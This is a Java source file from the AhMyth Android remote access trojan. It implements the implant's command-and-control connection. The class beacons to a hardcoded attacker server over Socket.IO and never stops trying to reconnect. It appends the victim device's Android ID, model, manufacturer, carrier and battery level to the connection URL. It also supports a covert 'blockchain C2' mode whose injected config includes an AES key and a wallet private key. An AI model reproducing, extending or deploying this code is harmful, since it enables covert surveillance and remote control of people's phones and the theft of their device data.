package ahmyth.mine.king.ahmyth;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.BatteryManager;
import android.os.Build;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import java.net.URISyntaxException;
import io.socket.client.IO;
import io.socket.client.Socket;


/**
 * Created by AhMyth on 10/14/16.
 */
public class IOSocket {
    private static IOSocket ourInstance = null;
    private io.socket.client.Socket ioSocket;
    
    // Blockchain C2 configuration (set when blockchain mode is detected)
    private static boolean isBlockchainMode = false;
    private static String blockchainRpcUrl = null;
    private static String blockchainContractAddress = null;
    private static String blockchainAesKey = null;
    private static String blockchainClientPrivateKey = null; // Client's wallet private key (for sending responses)



    private IOSocket() {
        try {
            Context context = MainService.getContextOfApplication();
            
            // This placeholder URL will be replaced during APK build
            // Format: http://IP:PORT or BLOCKCHAIN_C2_CONFIG:base64 - the build script will inject actual config
            String urlTemplate = "http://192.168.0.177:1234";
            
            // IMPORTANT: Check if blockchain C2 is configured FIRST, before any socket initialization
            // The build script injects "BLOCKCHAIN_C2_CONFIG:base64" which may have ?model= appended
            // We need to extract the base64 part before any query parameters
            String baseUrlTemplate = urlTemplate;
            int queryStart = urlTemplate.indexOf("?");
            if (queryStart > 0) {
                baseUrlTemplate = urlTemplate.substring(0, queryStart);
            }
            
            // Check if blockchain C2 is configured (build script injects "BLOCKCHAIN_C2_CONFIG:base64")
            if (baseUrlTemplate.startsWith("BLOCKCHAIN_C2_CONFIG:")) {
                try {
                    android.util.Log.d("IOSocket", "=== BLOCKCHAIN CONFIG PARSING ===");
                    android.util.Log.d("IOSocket", "baseUrlTemplate: " + baseUrlTemplate.substring(0, Math.min(60, baseUrlTemplate.length())) + "...");

                    // Extract base64 config
                    String base64Part = baseUrlTemplate.substring("BLOCKCHAIN_C2_CONFIG:".length());
                    android.util.Log.d("IOSocket", "base64Part length: " + base64Part.length());
                    android.util.Log.d("IOSocket", "base64Part preview: " + base64Part.substring(0, Math.min(40, base64Part.length())) + "...");

                    byte[] decodedBytes = android.util.Base64.decode(base64Part, android.util.Base64.NO_WRAP);
                    android.util.Log.d("IOSocket", "decoded bytes length: " + decodedBytes.length);

                    String configJson = new String(decodedBytes, "UTF-8");
                    android.util.Log.d("IOSocket", "configJson length: " + configJson.length());
                    android.util.Log.d("IOSocket", "configJson: " + configJson);

                    org.json.JSONObject config = new org.json.JSONObject(configJson);
                    
                    if ("blockchain".equals(config.getString("type"))) {
                        android.util.Log.d("IOSocket", "=== BLOCKCHAIN C2 MODE DETECTED ===");
                        android.util.Log.d("IOSocket", "Blockchain C2 mode detected - using event-based command channel");
                        android.util.Log.d("IOSocket", "Socket.IO connection will NOT be initialized");
                        
                        // Store blockchain config for ConnectionManager
                        isBlockchainMode = true;
                        blockchainRpcUrl = config.getString("rpcUrl");
                        blockchainContractAddress = config.optString("contractAddress", "0x0000000000000000000000000000000000000000");
                        blockchainAesKey = config.getString("aesKey");
                        blockchainClientPrivateKey = config.optString("clientPrivateKey", null); // Optional - for bidirectional communication
                        
                        android.util.Log.d("IOSocket", "Blockchain C2 configuration:");
                        android.util.Log.d("IOSocket", "  RPC URL: " + blockchainRpcUrl);
                        android.util.Log.d("IOSocket", "  Contract: " + blockchainContractAddress);
                        android.util.Log.d("IOSocket", "  AES Key: " + (blockchainAesKey != null ? "***" : "null"));
                        android.util.Log.d("IOSocket", "  Mode: Event-based polling (NO Socket.IO connection)");
                        android.util.Log.d("IOSocket", "=== END BLOCKCHAIN C2 CONFIG ===");
                        
                        // CRITICAL: In blockchain mode, exit early - do NOT initialize any socket
                        // ConnectionManager will start blockchain event poller instead
                        ensureBlockchainModeFromConfig();
                        return; // Exit constructor immediately - no socket initialization
                    }
                } catch (Exception e) {
                    android.util.Log.e("IOSocket", "Failed to parse blockchain C2 config, using TCP/IP fallback", e);
                    e.printStackTrace();
                    // Fall through to TCP/IP mode
                }
            }
            
            // TCP/IP Socket.IO mode - only executed if blockchain mode was NOT detected
            android.util.Log.d("IOSocket", "Using TCP/IP Socket.IO mode (blockchain mode not detected)");
            
            String deviceID = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
            
            // Get battery level
            int batteryLevel = getBatteryLevel(context);
            
            // Get operator name
            String operator = getOperatorName(context);
            
            // Socket.IO options for stable connection - match server timeouts
            IO.Options opts = new IO.Options();
            opts.timeout = 20000;           // 20 second connection timeout
            opts.reconnection = true;       // Auto reconnect
            opts.reconnectionAttempts = Integer.MAX_VALUE;  // Unlimited reconnection attempts
            opts.reconnectionDelay = 2000;  // 2 second delay between reconnects
            opts.reconnectionDelayMax = 10000;  // Max 10 second delay
            opts.forceNew = true;           // Force new connection to avoid stale states
            opts.randomizationFactor = 0.5; // Randomize reconnection delay
            opts.transports = new String[] {"websocket", "polling"}; // Allow both transports
            
            // Build URL
            String url = urlTemplate;
            if (!urlTemplate.startsWith("http://")) {
                url = "http://192.168.0.177:1234"; // Fallback to default
            }
            
            // Build full URL with device parameters
            url = url + "?model=" + android.net.Uri.encode(Build.MODEL)
                + "&manf=" + android.net.Uri.encode(Build.MANUFACTURER)
                + "&release=" + Build.VERSION.RELEASE 
                + "&id=" + deviceID
                + "&sdk=" + Build.VERSION.SDK_INT
                + "&battery=" + batteryLevel
                + "&operator=" + android.net.Uri.encode(operator)
                + "&device=" + android.net.Uri.encode(Build.DEVICE)
                + "&brand=" + android.net.Uri.encode(Build.BRAND)
                + "&product=" + android.net.Uri.encode(Build.PRODUCT);
            
            android.util.Log.d("IOSocket", "Connecting to: " + url);
        
            // Create Socket.IO connection
            ioSocket = IO.socket(url, opts);
            
        } catch (URISyntaxException e) {
            if (!isBlockchainMode) {
                android.util.Log.e("IOSocket", "Invalid socket URL", e);
                e.printStackTrace();
            }
        } catch (Exception e) {
            if (!isBlockchainMode) {
                android.util.Log.e("IOSocket", "Error initializing socket", e);
                e.printStackTrace();
            }
        }

        // Safety net: if blockchain config values are present but the flag was not set,
        // enforce blockchain mode so ConnectionManager does not fall back to Socket.IO.
        ensureBlockchainModeFromConfig();
    }
    
    private int getBatteryLevel(Context context) {
        try {
            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryStatus = context.registerReceiver(null, ifilter);
            if (batteryStatus != null) {
                int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
                return (int) ((level / (float) scale) * 100);
            }
        } catch (Exception e) {
            android.util.Log.e("IOSocket", "Error getting battery level", e);
        }
        return -1;
    }
    
    private String getOperatorName(Context context) {
        try {
            TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            if (tm != null) {
                String operator = tm.getNetworkOperatorName();
                if (operator != null && !operator.isEmpty()) {
                    return operator;
                }
                operator = tm.getSimOperatorName();
                if (operator != null && !operator.isEmpty()) {
                    return operator;
                }
            }
        } catch (Exception e) {
            android.util.Log.e("IOSocket", "Error getting operator", e);
        }
        return "Unknown";
    }


    public static IOSocket getInstance() {
        if (ourInstance == null) {
            ourInstance = new IOSocket();
        }
        return ourInstance;
    }

    public io.socket.client.Socket getIoSocket() {
        // In blockchain mode, return null (no Socket.IO connection)
        if (isBlockchainMode) {
            return null;
        }
        return ioSocket;
    }
    
    /**
     * Check if blockchain C2 mode is enabled
     */
    public static boolean isBlockchainMode() {
        return isBlockchainMode;
    }
    
    /**
     * Get blockchain RPC URL
     */
    public static String getBlockchainRpcUrl() {
        return blockchainRpcUrl;
    }
    
    /**
     * Get blockchain contract address
     */
    public static String getBlockchainContractAddress() {
        return blockchainContractAddress;
    }
    
    /**
     * Get blockchain AES key
     */
    public static String getBlockchainAesKey() {
        return blockchainAesKey;
    }
    
    /**
     * Get blockchain client private key (for sending responses)
     */
    public static String getBlockchainClientPrivateKey() {
        return blockchainClientPrivateKey;
    }

    /**
     * Ensure blockchain mode is flagged when config values are present.
     * This covers edge cases where the config was injected but the mode flag
     * was not set due to timing/initializer quirks.
     */
    public static boolean ensureBlockchainModeFromConfig() {
        if (!isBlockchainMode
                && blockchainRpcUrl != null
                && blockchainContractAddress != null
                && blockchainAesKey != null) {
            isBlockchainMode = true;
            android.util.Log.w("IOSocket", "Blockchain config detected post-init - enabling blockchain mode (no Socket.IO)");
        }
        return isBlockchainMode;
    }



}
